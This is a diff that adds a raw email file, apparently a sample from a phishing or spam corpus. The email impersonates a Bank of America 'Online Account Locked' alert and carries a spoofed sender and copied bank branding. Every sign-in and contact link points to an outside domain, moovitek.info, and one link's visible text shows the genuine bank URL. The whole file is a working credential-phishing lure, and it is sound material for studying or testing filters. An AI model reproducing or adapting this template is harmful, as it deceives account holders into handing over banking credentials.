@@ -1,0 +1,282 @@
+Return-Path: <root@kingdom.int>
+X-Original-To: user@login.example.com
+Delivered-To: user@login.example.com
+Received: from mail.example.org (mail.example.org [192.168.4.9])
+	by example.com (Postfix) with ESMTP id 332D846AA7
+	for <user@login.example.com>; Thu, 28 Dec 2006 19:52:23 -0500 (EST)
+Received: from mail.example.org (mail.example.org [192.168.6.4])
+	by mail.example.org (Postfix) with ESMTP id 1DEAF131FA7C
+	for <user@example.com>; Thu, 28 Dec 2006 19:52:23 -0500 (EST)
+Received: from kingdom.int (0x50c60c05.arcnxx17.adsl-dhcp.tele.dk [80.198.12.5])
+	by mail.example.org (Postfix) with ESMTP id A92096FA1C4
+	for <user@example.com>; Thu, 28 Dec 2006 19:52:22 -0500 (EST)
+Received: from kingdom.int (kingdom.int [127.0.0.1])
+	by kingdom.int (8.12.8/8.12.8) with ESMTP id kBU1cWlu025727
+	for <user@example.com>; Sat, 30 Dec 2006 02:38:32 +0100
+Received: (from root@localhost)
+	by kingdom.int (8.12.8/8.12.8/Submit) id kBU1cU5U025725;
+	Sat, 30 Dec 2006 02:38:30 +0100
+Date: Sat, 30 Dec 2006 02:38:30 +0100
+Message-Id: <200612300138.kBU1cU5U025725@kingdom.int>
+To: user@example.com
+Subject: Bank of America Alert: Online Account Locked
+From: "onlinebanking@alert.bankofamerica.com" <onlinebanking@alert.bankofamerica.com>
+Content-Type: text/html
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 564
+
+
+
+
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html lang="en">
+	<head>
+		<title>Bank of America Alert</title>
+
+		<!-- embedded style sheet -->
+		<style type="text/css">
+		<!--
+			a:link {
+				color: #405ebe;
+				background: #ffffff;
+			}
+			a:hover {
+				color: #0000ff;
+				background: #ffffff;
+			}
+			body, table, div, h1, h2, h3, h4, h5, h6, p {
+				font-family: verdana, arial, geneva, helvetica, sans-serif;
+				color: #222222;
+				background: #ffffff;
+			}
+			.font-sign-in {
+				font-size: 85%;
+				font-family: "times new roman";
+				font-weight: bold;
+			}
+			.font-title-red {
+				font-size: 120%;
+				color: #d4001a;
+				background: #ffffff;
+				font-weight: bold;
+				margin-bottom: 0.50em;
+			}
+			.font-x {
+				font-size: 75%;
+				font-family: verdana, arial, geneva, helvetica, sans-serif;
+			}
+			.font-y {
+				font-size: 70%;
+				font-family: verdana, arial, geneva, helvetica, sans-serif;
+			}
+			.font-footer {
+				color: #222222;
+				background: #ffffff;
+				font-size: 70%;
+				margin-top: 0em;
+				margin-bottom: 1em;
+			}
+			.inner-table {
+				width: 100%;
+				font-size: 75%;
+				font-family: verdana, arial, geneva, helvetica, sans-serif;
+				margin-bottom: 1em;
+			}
+			.paragraph-body {
+				font-size: 75%;
+				margin-top: 0.45em;
+				margin-bottom: 1em;
+				color: #222222;
+				background: #ffffff;
+			}
+			.paragraph-dynamic {
+				color: #405ebe;
+				background: #ffffff;
+				font-size: 75%;
+				font-family: verdana, arial, geneva, helvetica, sans-serif;
+				margin-top: 3em;
+				margin-bottom: 3em;
+			}
+			.paragraph-fine-print {
+				font-size: 70%;
+				margin-top: 1em;
+				margin-bottom: 1em;
+				color: #575756;
+				background: #ffffff;
+			}
+			.email-address {
+				text-transform: lowercase;
+			}
+			hr {
+				width: 100%;
+				color: #cccccc;
+			}
+			.red-heading {
+				width: 78.6%;
+			}
+			.bold { font-weight: bold; }
+			.first-col { width: 4.0%; }
+			.second-col { width: 17.4%; }
+			.third-col { width: 2.0%; }
+			.fourth-col { width: 76.6%; }
+			.first-second-col { width: 21.4%; }
+			.third-fourth-col { width: 78.6%; }
+			.first-second-third-col { width: 80.0%; }
+			.all-four-col { width: 100.0%; }
+			.banner-row { height: 80px; }
+			.sub-banner-row { height: 103px; }
+			.empty-row { height: 23px; }
+		-->
+		</style>
+
+	<!-- body -->
+	</head>
+	<body>
+		<table width="747" border="0" cellpadding="0" cellspacing="0" summary="Email Body Layout">
+			<!-- table header -->
+			<tr class="banner-row">
+				<td class="all-four-col" colspan="4">
+					<img width=317 height=80 src="http://alert.bankofamerica.com/images/client/bankofamerica/em_logo.gif" alt="Bank of America Higher Standards"></td>
+			</tr>
+			<!-- row 1 -->
+			<tr class="sub-banner-row">
+				<!-- row 1 cell 1-2 -->
+				<td class="first-second-col" colspan="2">
+					<img width=160 height=103 src="http://alert.bankofamerica.com/images/client/bankofamerica/em_photo.jpg" alt="Customer using a laptop for Online Banking"></td>
+				<!-- row 1 cell 3-4 -->
+				<TD class="red-heading" colspan="2" style="background: #d4001a">
+					<img width=193 height=103 src="http://alert.bankofamerica.com/images/client/bankofamerica/em_title_red.gif" alt="Online Banking Alert"></td>
+			</tr>
+			<!-- row 2 -->
+			<tr class="empty-row">
+				<!-- row 2 cell 1-4 -->
+				<td class="all-four-col" colspan="4">
+				</td>
+			</tr>
+			<!-- row 3 -->
+			<tr>
+				<!-- row 3 cell 1 -->
+				<td class="first-col">
+				</td>
+				<!-- row 3 cell 2 -->
+				<td class="second-col" valign="top">
+					<div class="font-sign-in">
+						Remember:<br>
+						Always look for your<br>
+						SiteKey before you<br>
+						<a href="http://moovitek.info/www.bankofamerica.com/index.html" style="color: #d4001a; text-decoration: none">Sign In &raquo;</a>
+					</div>
+				</td>
+				<!-- row 3 cell 3 -->
+				<td class="third-col">
+				</td>
+
+				<!-- Overrideable Section Start -->
+				<!-- row 3 cell 4 -->
+				<td class="fourth-col">
+					<h1 class="font-title-red">Online Account Locked</h1>
+					<table class="inner-table" border="0" cellpadding="0" cellspacing="0">
+						<tr>
+							<td><strong>Dear Bank Of America Customer</strong></td>
+						</tr>
+					</table>
+				</td>
+			</tr>
+			<!-- row 4 -->
+			<tr>
+				<!-- row 4 cell 1 -->
+				<td class="first-col">
+				</td>
+				<!-- row 4 cell 2 -->
+				<td class="second-col" valign="middle">
+					<div class="font-y">
+						You last logged in to<br>
+						Online Banking:<br>
+						24/12/2006
+					</div>
+				</td>
+				<!-- row 4 cell 3 -->
+				<td class="third-col">
+				</td>
+				<!-- row 4 cell 4 -->
+				<td class="fourth-col">
+					<p class="paragraph-body">
+						Due to the number of incorrect login attempts, your Bank of America Online Banking Account has been locked for your security on <strong>27/12/2006</strong>. You must reset your Passcode before you can enter Online Banking. You can reset your Passcode just with one click on the link below.
+					</p>
+					<p class="paragraph-body">
+						At Bank of America we care about your security so, for your protection we are proactively notifying you of this activity.
+					</p>
+					<p class="paragraph-body">
+						If you did not trigger this lockout, please try to sign in to http://moovitek.info/www.bankofamerica.com/index.html to confirm the lockout and then contact us immediately at 1.800.933.6262.
+					</p>
+				</td>
+			</tr>
+			<!-- Overrideable Section Finish -->
+			<!-- row 5 -->
+			<tr>
+				<!-- row 5 cell 1 -->
+				<td class="first-col">
+				</td>
+				<!-- row 5 cell 2 -->
+				<td class="second-col" valign="bottom">
+					<div class="font-y">
+						<br>
+						<span class="email-address"></span>
+					</div>
+				</td>
+				<!-- row 5 cell 3 -->
+				<td class="third-col">
+				</td>
+				<!-- row 5 cell 4 -->
+				<td class="fourth-col">
+					<p class="paragraph-body">Want to confirm this email is from Bank of America? Log in to Online Banking, select <span class="bold">Manage Alerts</span> and <span class="bold">Alerts History</span> to view all alerts sent from Bank of America. Your Alerts History is updated every 2 hours.
+					</p>
+					<p class="paragraph-dynamic">
+<A href="http://moovitek.info/www.bankofamerica.com/index.html" target=_self><FONT face=Verdana size=2><B>https://www.bankofamerica.com/signin/</B></FONT></A></P>
+					</p>
+				</td>
+			</tr>
+			<!-- row 6 -->
+			<tr>
+				<!-- row 6 cell 1 -->
+				<td class="first-col">
+				</td>
+				<!-- row 6 cell 2 -->
+				<td class="second-col">
+				</td>
+				<!-- row 6 cell 3 -->
+				<td class="third-col">
+				</td>
+				<!-- row 6 cell 4 -->
+				<td class="fourth-col">
+					<hr>
+					<p class="paragraph-fine-print">
+										<p class="paragraph-fine-print">
+						<strong style="text-transform: uppercase">Because E-Mail Is Not A Secure Form Of Communication, This E-Mail Box Is Not Equipped To Handle Replies.</strong><br>
+						If you have any questions about your account or need assistance, please call the phone number on your statement or go to <a href="http://moovitek.info/www.bankofamerica.com/index.html">Contact Us</a>. 
+					</p>
+				</td>
+			</tr>
+			<!-- table footer -->
+			<tr>
+				<td class="all-four-col" colspan="4">
+					<div class="font-footer">
+						<hr>
+						<img width=131 height=33 src="http://alert.bankofamerica.com/images/client/bankofamerica/OlympicLogo_2_6_8_1_1_image.gif" alt="Official Sponsor 2004-2008 U.S. Olympic Teams" align="right">
+						Bank of America, N.A. Member FDIC. <a href="http://www.bankofamerica.com/help/equalhousing.cfm">Equal Housing Lender</a>&nbsp;&nbsp;
+						<img width=14 height=9 src="http://alert.bankofamerica.com/images/client/bankofamerica/house_1.gif" alt=""><br>
+						&copy; 2006 Bank of America Corporation. All Rights Reserved.
+					</div>
+				</td>
+			</tr>
+		</table>
+	
+<img src='http://images.par3.com/AlertTrackingServlet?tid=640852610&dcc=SEA&retry=1&timeout=1160779706751' alt=''>
+</body>
+</html>
+
+
+
